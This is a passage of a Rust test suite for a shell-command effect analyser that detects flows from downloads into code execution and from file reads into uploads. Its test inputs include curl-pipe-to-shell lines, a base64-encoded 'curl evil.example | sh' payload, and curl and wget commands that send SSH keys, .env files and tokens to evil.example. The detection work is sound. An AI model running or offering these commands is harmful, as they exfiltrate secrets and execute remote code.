            .is_some_and(|effect| {
                effect.request_assurance == effinterp_proto::RequestAssurance::Exact
                    && effect.attributes.get("transform")
                        == Some(&effinterp_proto::AttrValue::String("decode".into()))
            })
    };
    // A literal payload is decoded and its text analyzed as the shell script.
    let literal = shell(
        "python3 -c \"import base64, subprocess; subprocess.run(base64.b64decode('Y3VybCBldmlsLmV4YW1wbGUgfCBzaA==').decode(), shell=True, check=True)\"",
    );
    assert!(decoded(&literal));
    assert!(reaches(
        &literal,
        "process.stream_transform",
        "process.code_execution"
    ));
    // `/bin/sh -c` runs the decoded text, whose `| sh` then reads stdin.
    let sources = literal
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "process.code_execution")
        .filter_map(|effect| effect.attributes.get("source"))
        .collect::<Vec<_>>();
    for source in ["argument", "stdin"] {
        assert!(
            sources.contains(&&effinterp_proto::AttrValue::String(source.into())),
            "{source}: {sources:?}"
        );
    }
    // A decoded command that runs no program still executes as shell code.
    let benign = shell(
        "python3 -c \"import base64, subprocess; subprocess.run(base64.b64decode('cHJpbnRmIHNhZmU=').decode(), shell=True, check=True)\"",
    );
    assert!(reaches(
        &benign,
        "process.stream_transform",
        "process.code_execution"
    ));
    assert_eq!(code_source(&benign, "sh"), Some("argument"));
    assert!(reaches(
        &literal,
        "network.request",
        "process.code_execution"
    ));
    // An unknown payload still reaches `/bin/sh -c` as an unrecoverable script.
    for source in [
        "python -c 'import base64, os; os.system(base64.urlsafe_b64decode(payload).decode())'",
        "python -c 'import base64, subprocess; subprocess.check_call(base64.b64decode(payload), shell=True,)'",
    ] {
        let plan = shell(source);
        assert!(decoded(&plan), "{source}");
        assert!(
            reaches(&plan, "process.stream_transform", "process.code_execution"),
            "{source}"
        );
        assert_eq!(code_source(&plan, "sh"), Some("argument"), "{source}");
    }
    // Decoded bytes that are written, compared, or printed execute nothing.
    for source in [
        "python -c 'import base64; open(\"out.bin\", \"wb\").write(base64.b64decode(payload))'",
        "python -c 'import base64, sys; sys.exit(base64.b64decode(payload) == b\"ok\")'",
        "python -c 'import base64; print(base64.b64decode(payload).decode())'",
    ] {
        let plan = shell(source);
        assert!(decoded(&plan), "{source}");
        assert!(
            !reaches(&plan, "process.stream_transform", "process.code_execution"),
            "{source}"
        );
    }
}

#[test]
fn a_file_url_reaches_piped_code_as_a_local_read() {
    let plan = shell("curl file:///tmp/payload.sh | bash");
    assert!(reaches(&plan, "filesystem.read", "process.code_execution"));
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| effect.operation.0.starts_with("network."))
    );
}

#[test]
fn every_curl_stdout_response_reaches_piped_code() {
    let plan = shell("curl https://a.example https://b.example | bash");
    let targets = graph(&plan)
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction { operation, .. }
                if operation.0 == "process.code_execution" =>
            {
                Some(node.id.clone())
            }
            _ => None,
        })
        .collect();
    let responses = graph(&plan)
        .nodes
        .iter()
        .filter(|node| {
            matches!(
                &node.occurrence,
                OccurrenceKind::ResourceInteraction { operation, .. }
                    if operation.0 == "network.request"
            )
        })
        .collect::<Vec<_>>();
    assert_eq!(responses.len(), 2);
    for response in responses {
        assert!(reaches_from(graph(&plan), response.id.clone(), &targets));
    }
}

#[test]
fn interpreter_stdin_sinks_receive_pipeline_input() {
    for interpreter in ["python3", "python3.12", "node", "ruby", "perl", "php"] {
        let plan = shell(&format!("curl example.com | {interpreter}"));
        assert_eq!(
            code_source(&plan, interpreter),
            Some("stdin"),
            "{interpreter}"
        );
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{interpreter}"
        );
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "dynamic_source"),
            "{interpreter}"
        );
    }
}

#[test]
fn declarative_interpreter_sources_drive_code_execution_flows() {
    for interpreter in ["lua", "Rscript", "fish"] {
        let plan = shell(&format!("curl https://x | {interpreter}"));
        assert_eq!(
            code_source(&plan, interpreter),
            Some("stdin"),
            "{interpreter}"
        );
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{interpreter}"
        );
    }

    let inline = shell("lua -e \"$(curl https://x)\"");
    assert_eq!(code_source(&inline, "lua"), Some("argument"));
    assert!(reaches(
        &inline,
        "network.request",
        "process.code_execution"
    ));

    let file = shell("lua script.lua");
    assert_eq!(code_source(&file, "lua"), Some("file"));
    assert!(
        file.effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.read")
    );

    let subcommand = shell("swift build");
    assert!(
        subcommand
            .effects
            .iter()
            .all(|effect| effect.operation.0 != "filesystem.read")
    );
    assert!(
        subcommand
            .boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unmodeled_subcommand")
    );
}

#[test]
fn interpreter_source_shape_controls_flow_wiring() {
    let interactive = shell("python3");
    assert_eq!(code_source(&interactive, "python3"), Some("interactive"));

    let redirected = shell("python3 - < script.py");
    assert_eq!(code_source(&redirected, "python3"), Some("stdin"));
    assert!(reaches(
        &redirected,
        "filesystem.read",
        "process.code_execution"
    ));

    let downloaded = shell("curl -o script.py example.com; python3 script.py");
    assert_eq!(code_source(&downloaded, "python3"), Some("file"));
    assert!(reaches(
        &downloaded,
        "network.download",
        "process.code_execution"
    ));

    let nested = shell("bash -c 'curl example.com | python3'");
    assert_eq!(code_source(&nested, "python3"), Some("stdin"));
    assert!(reaches(
        &nested,
        "network.request",
        "process.code_execution"
    ));

    for interpreter in ["powershell", "pwsh"] {
        let plan = shell(&format!("curl example.com | {interpreter} -File -"));
        assert_eq!(code_source(&plan, interpreter), Some("stdin"));
        assert!(reaches(&plan, "network.request", "process.code_execution"));
    }
}

#[test]
fn explicit_stdin_after_end_of_options_receives_pipeline_input() {
    for (interpreter, command) in [
        ("python3", "curl example.com | python3 -- -"),
        ("node", "curl example.com | node -- -"),
        ("ruby", "curl example.com | ruby -- -"),
        ("php", "curl example.com | php -- -"),
    ] {
        let plan = shell(command);
        assert_eq!(code_source(&plan, interpreter), Some("stdin"), "{command}");
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != "filesystem.read"),
            "{command}"
        );
    }
}

#[test]
fn wrapped_interpreter_stdin_inherits_the_enclosing_pipeline() {
    for (source, interpreter) in [
        ("curl example.com | setsid sh", "sh"),
        ("curl example.com | env python3", "python3"),
        ("curl example.com | bash -c 'python3'", "python3"),
    ] {
        let plan = shell(source);
        assert_eq!(code_source(&plan, interpreter), Some("stdin"), "{source}");
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{source}"
        );
    }
}

#[test]
fn downloaded_executable_paths_retain_code_input_without_inventing_contents() {
    for source in [
        "curl -o downloaded.sh https://example.com/payload && ./downloaded.sh",
        "curl https://example.com/payload >downloaded.sh; ./downloaded.sh",
        "curl -o downloaded.sh https://example.com/payload; cp downloaded.sh copied; ./copied",
        "curl -o cat https://example.com/payload; ./cat",
        "curl -o bash https://example.com/payload; ./bash -c 'rm victim'",
    ] {
        let plan = shell(source);
        assert!(
            reaches(&plan, "network.download", "process.code_execution")
                || reaches(&plan, "network.request", "process.code_execution"),
            "{source}"
        );
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "unmodeled_command")
        );
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.delete")
        );
    }
    let unrelated = shell("curl -o downloaded.sh https://example.com/payload; ./other");
    assert!(!reaches(
        &unrelated,
        "network.download",
        "process.code_execution"
    ));
    let conditional = shell(
        "curl -o downloaded.sh https://example.com/payload; if test x = y; then ./downloaded.sh; fi",
    );
    assert!(
        conditional
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "process.code_execution")
            .all(|effect| effect.modality == Modality::May && effect.condition.is_some())
    );
}

#[test]
fn curl_download_binds_only_its_output_file() {
    for source in [
        "curl -o payload.py example.com > safe.py; python3 safe.py",
        "curl -o downloaded.py \"$(echo local > victim.py; echo example.com)\"; python3 victim.py",
        "curl -o payload.py -c cookies example.com; python3 cookies",
        "curl -OJ https://example.com/payload.py; python3 payload.py",
        "curl --no-clobber -O https://example.com/payload.py; python3 payload.py",
    ] {
        let plan = shell(source);
        assert!(
            !reaches(&plan, "network.download", "process.code_execution"),
            "{source}"
        );
    }
    struct MissingPayload;
    impl effinterp_engine::ObservationResolver for MissingPayload {
        fn observe(
            &self,
            query: &effinterp_proto::ObservationQuery,
            _budget: effinterp_engine::ObservationBudget,
        ) -> effinterp_proto::ObservationOutcome {
            let effinterp_proto::ObservationQuery::Path { path } = query else {
                return effinterp_proto::ObservationOutcome::Refused(
                    effinterp_proto::ObservationRefusal::Unobserved,
                );
            };
            assert_eq!(path, "/w/payload.py");
            effinterp_proto::ObservationOutcome::Path(effinterp_proto::PathFact {
                entry: path.clone(),
                kind: effinterp_proto::PathKind::Missing,
                followed: effinterp_proto::Fact::Known(effinterp_proto::PathTarget {
                    path: path.clone(),
                    kind: effinterp_proto::Fact::Known(effinterp_proto::PathKind::Missing),
                }),
                executable: None,
            })
        }
    }
    let absent = Engine::new()
        .with_causality_detail(true)
        .analyze_with_observations(
            &Subject::Shell {
                source: "curl --no-clobber -O https://example.com/payload.py && python3 payload.py"
                    .into(),
                cwd: Some("/w".into()),
                context: Default::default(),
            },
            None,
            None,
            Some(std::sync::Arc::new(MissingPayload)),
        )
        .unwrap();
    validate_plan(&absent).unwrap();
    assert!(reaches(
        &absent,
        "network.download",
        "process.code_execution"
    ));
}

#[test]
fn attached_curl_output_reaches_interpreter_file() {
    let plan = shell("curl -opayload.py example.com; python3 payload.py");
    assert!(reaches(&plan, "network.download", "process.code_execution"));
}

#[test]
fn mixed_curl_outputs_reach_the_matching_interpreter_file() {
    let plan = shell("curl -o a.py example.com -O example.org/b.py; python3 a.py");
    assert!(reaches(&plan, "network.download", "process.code_execution"));
}

#[test]
fn curl_output_selector_applies_to_one_response() {
    let plan = shell("curl -o saved.py https://a.example https://b.example | bash");
    let targets = graph(&plan)
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction { operation, .. }
                if operation.0 == "process.code_execution" =>
            {
                Some(node.id.clone())
            }
            _ => None,
        })
        .collect();
    let responses = graph(&plan)
        .nodes
        .iter()
        .filter(|node| {
            matches!(
                &node.occurrence,
                OccurrenceKind::ResourceInteraction { operation, .. }
                    if operation.0.starts_with("network.")
            )
        })
        .collect::<Vec<_>>();
    assert_eq!(responses.len(), 2);
    assert!(!reaches_from(
        graph(&plan),
        responses[0].id.clone(),
        &targets
    ));
    assert!(reaches_from(
        graph(&plan),
        responses[1].id.clone(),
        &targets
    ));
    assert_eq!(
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0 == "network.download")
            .count(),
        1
    );
    assert_eq!(
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0 == "network.request")
            .count(),
        1
    );
}

#[test]
fn curl_option_value_that_looks_like_output_flag_stays_on_stdout() {
    let plan = shell("curl -H -o https://x | bash");
    assert!(reaches(&plan, "network.request", "process.code_execution"));
    assert!(
        plan.effects
            .iter()
            .all(|effect| effect.operation.0 != "filesystem.write")
    );
}

#[test]
fn curl_url_flags_preserve_response_order() {
    let plan = shell("curl --url https://a.example -o saved.py https://b.example | bash");
    let targets = graph(&plan)
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction { operation, .. }
                if operation.0 == "process.code_execution" =>
            {
                Some(node.id.clone())
            }
            _ => None,
        })
        .collect();
    let responses = graph(&plan)
        .nodes
        .iter()
        .filter(|node| {
            matches!(
                &node.occurrence,
                OccurrenceKind::ResourceInteraction { operation, .. }
                    if operation.0.starts_with("network.")
            )
        })
        .collect::<Vec<_>>();
    assert_eq!(responses.len(), 2);
    assert!(!reaches_from(
        graph(&plan),
        responses[0].id.clone(),
        &targets
    ));
    assert!(reaches_from(
        graph(&plan),
        responses[1].id.clone(),
        &targets
    ));
}

#[test]
fn node_value_options_leave_stdin_as_the_code_source() {
    for command in [
        "curl example.com | node --permission --allow-fs-read /tmp",
        "curl example.com | node --permission --allow-fs-write /tmp",
        "curl example.com | node --input-type module",
        "curl example.com | node --icu-data-dir /tmp",
        "curl example.com | node --inspect-port 9999",
        "curl example.com | node --debug-port 9999",
        "curl example.com | node --max-http-header-size 8192",
        "curl example.com | node --cpu-prof --cpu-prof-dir /tmp",
        "curl example.com | node --cpu-prof --cpu-prof-interval 1000",
        "curl example.com | node --cpu-prof --cpu-prof-name profile.cpuprofile",
        "curl example.com | node --diagnostic-dir /tmp",
        "curl example.com | node --disable-proto delete",
        "curl example.com | node --disable-warning DeprecationWarning",
        "curl example.com | node --dns-result-order ipv4first",
        "curl example.com | node --title worker",
        "curl example.com | node --env-file .env",
        "curl example.com | node --env-file-if-exists .env",
        "curl example.com | node --experimental-test-isolation process",
        "curl example.com | node --experimental-test-tag-filter fast",
        "curl example.com | node --openssl-config openssl.cnf",
        "curl example.com | node --inspect-publish-uid stderr",
        "curl example.com | node --localstorage-file /tmp/localstorage",
        "curl example.com | node --max-old-space-size-percentage 50",
        "curl example.com | node --network-family-autoselection-attempt-timeout 250",
        "curl example.com | node --redirect-warnings /tmp/node-warnings.log",
        "curl example.com | node --report-dir /tmp",
        "curl example.com | node --report-directory /tmp",
        "curl example.com | node --report-filename report.json",
        "curl example.com | node --report-signal SIGUSR1",
        "curl example.com | node --secure-heap 32768",
        "curl example.com | node --secure-heap-min 2",
        "curl example.com | node --snapshot-blob snapshot.blob",
        "curl example.com | node --test-concurrency 2",
        "curl example.com | node --test-coverage-branches 80",
        "curl example.com | node --test-coverage-exclude test.js",
        "curl example.com | node --test-coverage-functions 80",
        "curl example.com | node --test-coverage-include test.js",
        "curl example.com | node --test-coverage-lines 80",
        "curl example.com | node --test-global-setup setup.js",
        "curl example.com | node --test-isolation process",
        "curl example.com | node --test-name-pattern fast",
        "curl example.com | node --test-random-seed 1",
        "curl example.com | node --test-reporter spec",
        "curl example.com | node --test-reporter-destination stdout",
        "curl example.com | node --test-rerun-failures state.json",
        "curl example.com | node --test-shard 1/2",
        "curl example.com | node --test-skip-pattern slow",
        "curl example.com | node --test-timeout 1000",
        "curl example.com | node --heapsnapshot-signal SIGUSR2",
        "curl example.com | node --tls-cipher-list DEFAULT",
        "curl example.com | node --tls-keylog tls.log",
        "curl example.com | node --trace-event-categories v8",
        "curl example.com | node --trace-event-file-pattern trace-%pid.json",
        "curl example.com | node --trace-require-module all",
        "curl example.com | node --unhandled-rejections strict",
        "curl example.com | node --use-largepages off",
        "curl example.com | node --v8-pool-size 2",
        "curl example.com | node --heap-prof --heap-prof-dir /tmp",
        "curl example.com | node --heap-prof --heap-prof-interval 1024",
        "curl example.com | node --heap-prof --heap-prof-name profile.heapprofile",
        "curl example.com | node --heapsnapshot-near-heap-limit 0",
        "curl example.com | node --watch-kill-signal SIGTERM",
        "curl example.com | node --watch-path /tmp",
    ] {
        let plan = shell(command);
        assert_eq!(code_source(&plan, "node"), Some("stdin"), "{command}");
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != "filesystem.read"),
            "{command}"
        );
    }
}

#[test]
fn node_print_without_an_argument_receives_pipeline_input() {
    for option in ["-p", "--print"] {
        let command = format!("curl example.com | node {option}");
        let plan = shell(&command);
        assert_eq!(code_source(&plan, "node"), Some("stdin"), "{command}");
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
    }
}

#[test]
fn empty_attached_node_source_does_not_execute_piped_input() {
    let plan = shell("curl example.com | node --eval=");
    assert!(!reaches(&plan, "network.request", "process.code_execution"));
    assert!(
        plan.effects
            .iter()
            .all(|effect| effect.operation.0 != "process.code_execution")
    );
}

#[test]
fn node_alternate_source_modes_do_not_use_pipeline_input_as_code() {
    for command in [
        "curl example.com | node --run=build",
        "curl example.com | node --experimental-sea-config=sea.json",
        "curl example.com | node --build-snapshot",
        "curl example.com | node --build-snapshot-config=config.json",
        "curl example.com | node --prof-process isolate.log",
    ] {
        let plan = shell(command);
        assert_eq!(code_source(&plan, "node"), None, "{command}");
        assert!(
            !reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != "filesystem.read"),
            "{command}"
        );
    }
}

#[test]
fn node_build_snapshot_entry_point_is_file_code() {
    let plan = shell("curl -o script.js example.com; node --build-snapshot script.js");
    assert_eq!(code_source(&plan, "node"), Some("file"));
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.read")
    );
    assert!(reaches(&plan, "network.download", "process.code_execution"));
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "dynamic_source")
    );
}

#[test]
fn perl_launcher_options_preserve_stdin_code() {
    for command in [
        "curl example.com | perl -w",
        "curl example.com | perl -T",
        "curl example.com | perl -f",
        "curl example.com | perl -I /tmp",
        "curl example.com | perl -l",
        "curl example.com | perl -Mstrict",
        "curl example.com | perl -0",
        "curl example.com | perl -0777",
        "curl example.com | perl -C",
        "curl example.com | perl -s",
        "curl example.com | perl -W",
        "curl example.com | perl -U",
        "curl example.com | perl -a",
    ] {
        let plan = shell(command);
        assert_eq!(code_source(&plan, "perl"), Some("stdin"));
        assert!(reaches(&plan, "network.request", "process.code_execution"));
    }
}

#[test]
fn perl_implicit_loop_modes_receive_pipeline_code() {
    for command in ["curl example.com | perl -n", "curl example.com | perl -p"] {
        let plan = shell(command);
        assert_eq!(code_source(&plan, "perl"), Some("stdin"), "{command}");
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
    }
}

#[test]
fn irb_verbose_preserves_stdin_code() {
    let plan = shell("curl example.com | irb --verbose");
    assert_eq!(code_source(&plan, "irb"), Some("stdin"));
    assert!(reaches(&plan, "network.request", "process.code_execution"));
}

#[test]
fn ruby_version_with_another_switch_preserves_stdin_code() {
    for command in [
        "curl example.com | ruby -v -w",
        "curl example.com | ruby -w -v",
    ] {
        let plan = shell(command);
        assert_eq!(code_source(&plan, "ruby"), Some("stdin"), "{command}");
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
    }
}

#[test]
fn perl_clustered_inline_code_is_an_argument_source() {
    let plan = shell("curl example.com | perl -ne 'print'");
    assert_eq!(code_source(&plan, "perl"), Some("argument"));
}

#[test]
fn detached_perl_inline_code_keeps_its_producer_path() {
    for command in [
        "perl -e \"$(curl example.com)\"",
        "perl -E \"$(curl example.com)\"",
    ] {
        let plan = shell(command);
        assert_eq!(code_source(&plan, "perl"), Some("argument"), "{command}");
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
    }
}

#[test]
fn interpreter_value_options_preserve_stdin_code() {
    for (interpreter, command) in [
        ("python2", "curl example.com | python2 -Q warn"),
        (
            "pwsh",
            "curl example.com | pwsh -ExecutionPolicy Bypass -Command -",
        ),
        (
            "pwsh",
            "curl example.com | pwsh -inputformat Text -Command -",
        ),
        (
            "powershell",
            "curl example.com | powershell -OutputFormat Text -Command -",
        ),
        (
            "pwsh",
            "curl example.com | pwsh -OutputFormat Text -Command -",
        ),
        (
            "pwsh",
            "curl example.com | pwsh -WorkingDirectory /tmp -Command -",
        ),
        (
            "powershell",
            "curl example.com | powershell -WindowStyle Hidden -Command -",
        ),
        ("php", "curl example.com | php --php-ini /tmp/php.ini"),
        ("php", "curl example.com | php --define display_errors=1"),
        (
            "php",
            "curl example.com | php --zend-extension extension.so",
        ),
        ("pwsh", "curl example.com | pwsh -NoProfile -Command -"),
    ] {
        let plan = shell(command);
        assert_eq!(code_source(&plan, interpreter), Some("stdin"));
        assert!(reaches(&plan, "network.request", "process.code_execution"));
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != "filesystem.read")
        );
    }
}

#[test]
fn shell_option_values_do_not_hide_stdin_code() {
    for command in [
        "curl example.com | bash -euo pipefail",
        "curl example.com | bash -n +n",
        "curl example.com | bash --init-file /dev/null",
        "curl example.com | bash --rcfile /dev/null",
    ] {
        let plan = shell(command);
        assert_eq!(code_source(&plan, "bash"), Some("stdin"));
        assert!(reaches(&plan, "network.request", "process.code_execution"));
    }
}

#[test]
fn attached_inline_source_is_an_argument_not_a_script_path() {
    for (interpreter, command) in [
        ("bash", "bash -c\"$(curl example.com)\""),
        ("python3", "python3 -c\"$(curl example.com)\""),
        ("node", "node -e\"$(curl example.com)\""),
        ("ruby", "ruby -e\"$(curl example.com)\""),
        ("php", "php -r\"$(curl example.com)\""),
    ] {
        let plan = shell(command);
        assert_eq!(
            code_source(&plan, interpreter),
            Some("argument"),
            "{command}"
        );
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.read"),
            "{command}"
        );
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
    }

    // A clustered `-c` takes the following word as the script, like a bare one.
    for (interpreter, command) in [
        ("bash", "bash -ce \"rm /tmp/bash-cluster\""),
        ("bash", "bash -co pipefail \"rm /tmp/bash-value-cluster\""),
        (
            "python3",
            "python3 -ic \"import os; os.remove('/tmp/python-cluster')\"",
        ),
    ] {
        let plan = shell(command);
        assert_eq!(code_source(&plan, interpreter), Some("argument"));
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.delete"),
            "{command}"
        );
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.read"),
            "{command}"
        );
    }
}

#[test]
fn shell_noexec_never_executes_stdin_code() {
    for command in [
        "curl example.com | bash -n -",
        "curl example.com | bash -o noexec -",
        "curl example.com | bash -D",
        "curl example.com | bash --dump-strings",
        "curl example.com | bash --dump-po-strings",
        "curl example.com | bash --pretty-print",
    ] {
        let plan = shell(command);
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "process.code_execution"),
            "{command}"
        );
    }
}

#[test]
fn non_executing_interpreter_modes_do_not_emit_code_sinks() {
    for command in [
        "curl example.com | python3 --version",
        "curl example.com | python3 '-?'",
        "curl example.com | node --v8-options",
        "curl example.com | node --completion-bash",
        "curl example.com | node --test",
        "node --check script.js",
        "ruby -c script.rb",
        "curl example.com | ruby --dump=syntax",
        "curl example.com | ruby --verbose",
        "curl example.com | ruby -v",
        "curl example.com | irb -v",
        "curl example.com | ruby --dump=version",
        "php -l script.php",
        "curl example.com | php -w",
        "curl example.com | php '-?'",
        "curl example.com | php --usage",
        "curl example.com | php --syntax-highlighting",
        "curl example.com | php --ini",
        "php --rf strlen",
        "php --rc Example",
        "php -s example.php",
        "curl example.com | php -S localhost:8000",
        "curl example.com | php -S localhost:8000 -t public",
        "curl example.com | php --server localhost:8000 --docroot public",
    ] {
        let plan = shell(command);
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "process.code_execution"),
            "{command}"
        );
    }

    for command in [
        "node --check script.js",
        "ruby -c script.rb",
        "php -l script.php",
        "php -s example.php",
    ] {
        let plan = shell(command);
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.read"),
            "{command}"
        );
    }

    for command in ["node --check -", "ruby -c -", "php -l -"] {
        let plan = shell(command);
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != "process.code_execution"),
            "{command}"
        );
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != "filesystem.read"),
            "{command}"
        );
    }
}

#[test]
fn node_test_dash_is_not_pipeline_code() {
    for command in [
        "curl example.com | node --test -",
        "curl example.com | node --test -- -",
    ] {
        let plan = shell(command);
        assert_eq!(code_source(&plan, "node"), Some("file"), "{command}");
        assert!(
            !reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
    }
}

#[test]
fn php_process_modes_classify_their_code_operand() {
    for flag in ["-B", "-R", "-E"] {
        let command = format!("curl example.com | php {flag} 'echo 1;'");
        let plan = shell(&command);
        assert_eq!(code_source(&plan, "php"), Some("argument"), "{command}");
        assert!(
            !reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
    }

    let plan = shell("curl example.com | php -F processor.php");
    assert_eq!(code_source(&plan, "php"), Some("file"));
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.read")
    );
    assert!(!reaches(&plan, "network.request", "process.code_execution"));
}

#[test]
fn eval_sink_names_the_shell_interpreter() {
    // An effectless nested body leaves the eval sink as the only effect.
    let plan = shell("eval \"echo ok\"");
    assert_eq!(code_source(&plan, "sh"), Some("argument"));
    assert!(plan.effects.iter().any(|effect| {
        matches!(
            &effect.resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::Process {
                    executable,
                    cwd: Some(cwd),
                    ..
                },
            } if effect.operation.0 == "process.code_execution"
                && executable == "sh"
                && matches!(
                    cwd.as_ref(),
                    ResourceExpr::Concrete {
                        identity: ResourceIdentity::FsPath { path },
                    } if path == "/w"
                )
        )
    }));

    let terminated = shell("eval -- \"rm /tmp/eval-probe\"");
    assert!(
        terminated
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete")
    );

    let changed_directory = shell("eval 'cd /tmp'; cat secret");
    assert!(changed_directory.effects.iter().any(|effect| {
        matches!(
            &effect.resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path },
            } if effect.operation.0 == "filesystem.read" && path == "/tmp/secret"
        )
    }));
}

#[test]
fn dynamic_script_operand_still_reads_the_script() {
    let plan = shell("curl -o \"$SCRIPT\" example.com; node \"$SCRIPT\"");
    assert_eq!(code_source(&plan, "node"), Some("file"));
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.read")
    );

    for (interpreter, command) in [
        ("node", "node \"-$SCRIPT\""),
        ("php", "php \"-$SCRIPT\""),
        ("python3", "python3 \"-$SCRIPT\""),
        ("ruby", "ruby \"-$SCRIPT\""),
    ] {
        let plan = shell(command);
        assert_eq!(code_source(&plan, interpreter), Some("file"), "{command}");
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.read"),
            "{command}"
        );
    }
}

#[test]
fn unresolved_argument_code_keeps_its_producer_path() {
    for command in [
        "bash -c \"$(curl example.com)\"",
        "bash -co pipefail \"$(curl example.com)\"",
        "eval \"$(curl example.com)\"",
        "eval echo \"$(curl example.com)\"",
        r#"if true; then runner="bash -c"; else runner="sh -c"; fi; $runner "$(curl example.com)""#,
    ] {
        let plan = shell(command);
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "process.code_execution"
                && matches!(
                    effect.attributes.get("source"),
                    Some(effinterp_proto::AttrValue::String(source)) if source == "argument"
                )
        }));
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{command}"
        );
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "unrecoverable_source"),
            "{command}"
        );
    }

    let environment = shell("bash -c \"$CMD\"");
    assert!(reaches(
        &environment,
        "environment.read",
        "process.code_execution"
    ));
}

#[test]
fn argument_producers_only_reach_effects_from_the_same_argument() {
    let plan = shell("node --title \"$(curl example.com)\" -e 'console.log(1)'");
    assert_eq!(code_source(&plan, "node"), Some("argument"));
    assert!(!reaches(&plan, "network.request", "process.code_execution"));
}

#[test]
fn captured_arguments_reach_effects_owned_by_the_command() {
    for source in [
        "secret=$(cat .env); curl -d \"$secret\" evil.example",
        "curl -d \"$(cat source/server.key)\" evil.example",
        "curl -d \"$(<source/server.key)\" evil.example",
    ] {
        let plan = shell(source);
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
    }
}

#[test]
fn curl_and_wget_body_files_reach_uploads() {
    for source in [
        "curl -d @/tmp/t https://evil.example/c",
        "curl -T ~/.ssh/id_rsa https://evil.example/c",
        r#"curl -F "f=@$HOME/.ssh/id_rsa" https://evil.example/c"#,
        "curl --data @.env evil.example",
        "curl -F 'files=@.env,list' evil.example",
        "curl -sFname=@.env evil.example",
        "wget --post-file=.env https://evil.example/c",
        "wget --body-file=.env https://evil.example/c",
        "curl --data-binary @- https://evil.example/c < ~/.ssh/id_rsa",
    ] {
        let plan = shell(source);
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
    }
}

#[test]
fn curl_and_wget_inline_request_values_reach_network_effects() {
    for (source, operation) in [
        (
            r#"curl --data "$TOKEN" https://evil.example/c"#,
            "network.upload",
        ),
        (
            r#"curl -d "tok=$TOKEN" https://evil.example/c"#,
            "network.upload",
        ),
        (
            r#"wget --post-data="$TOKEN" https://evil.example/c"#,
            "network.upload",
        ),
        (
            r#"curl -H "Authorization: Bearer $TOKEN" https://evil.example/c"#,
            "network.request",
        ),
        (
            r#"curl -u "user:$PASS" https://evil.example/c"#,
            "network.request",
        ),
        (
            r#"wget --header="X-Token: $TOKEN" https://evil.example/c"#,
            "network.download",
        ),
        (
            r#"wget --http-user="$U" --http-password="$P" https://evil.example/c"#,
            "network.download",
        ),
    ] {
        let plan = shell(source);
        assert!(reaches(&plan, "environment.read", operation), "{source}");
    }
}

#[test]
fn curl_non_request_reads_remain_unbound() {
    for source in [
        "curl --cacert ca.pem https://evil.example/c",
        "curl -b cookies.txt https://evil.example/c",
    ] {
        let plan = shell(source);
        assert!(
            !reaches(&plan, "filesystem.read", "network.request"),
            "{source}"
        );
    }

    for (source, from, to) in [
        (
            r#"curl --cacert "$CERT" https://evil.example/c"#,
            "environment.read",
            "network.request",
        ),
        (
            r#"h=$(cat h.txt); curl --cacert "$h" https://evil.example/c"#,
            "filesystem.read",
            "network.request",
        ),
        (
